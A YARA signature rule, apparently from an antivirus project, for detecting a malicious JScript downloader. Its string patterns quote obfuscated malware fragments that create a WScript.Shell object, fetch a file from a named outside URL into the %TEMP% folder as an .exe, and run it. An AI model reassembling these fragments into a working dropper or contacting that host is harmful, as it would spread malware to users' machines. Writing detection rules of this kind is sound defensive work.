rule sig_20160328_8c29aa687d32ce498b9961e7ac15a495 {
  meta:
    description = "datamaliciousorder - file 20160328_8c29aa687d32ce498b9961e7ac15a495.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ba74dfa981dd455c3ab5e3a73119fef7c4dbcb23a861754cd08ed367cd20ddcd"

  strings:
    $s1  = "function Avrfrbk() {return Wpqvxd[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"RKGNiAGdQ8G5xwIo.exe\";};" fullword ascii
    $s2  = "Afklwljl[Baysflh](\"GET\", \"http://www.hiveclick.com/m4usd\", false);" fullword ascii
    $s3  = "do {WScript[Ibkafvvphe](Jmdmtvgqpd() * 11)} while (Afklwljl[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Yakuzyffbh(Teyrqqmobb, Gxixnbs){return Teyrqqmobb - Gxixnbs;};" fullword ascii
    $s5  = "var Wpqvxd = function Kprwxznda() {return WScript[Ready](\"WScript.Shell\");}();" fullword ascii
    $s6  = " Afklwljl = WScript[Ready](Zftgpysmm);" fullword ascii
    $s7  = "function Vwwituvs() {return ((Faldht == true) && (Faldht == Feyvz)) ? 1 : Krtjkq;};" fullword ascii
    $s8  = "var Ready = \"CreateObject\";" fullword ascii
    $s9  = "function Zrjyapjk(){return Ready;};" fullword ascii
    $s10 = "function Uwguu(Pozxh){Wpqvxd[\"Run\"](Pozxh, Krtjkq, Krtjkq);};" fullword ascii
    $s11 = "return Yakuzyffbh(Raidxkg, Krakhk);" fullword ascii
    $s12 = "var Vmuwstzm = false;" fullword ascii
    $s13 = " while (Zcvypzpx){" fullword ascii
    $s14 = "function Bfhgmeqwbx()" fullword ascii
    $s15 = "function Lhinys(){return Eyhsfwg;};" fullword ascii
    $s16 = "Faldht = true; " fullword ascii
    $s17 = "Feyvz = true; " fullword ascii
    $s18 = "var Faldht = false;" fullword ascii
    $s19 = "function Jmdmtvgqpd(){return 22;};" fullword ascii
    $s20 = "function Rcwgaywdh(Ghsytxed) {var Kykfgi = (1, 2, 3, 4, 5, Ghsytxed); return Kykfgi;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}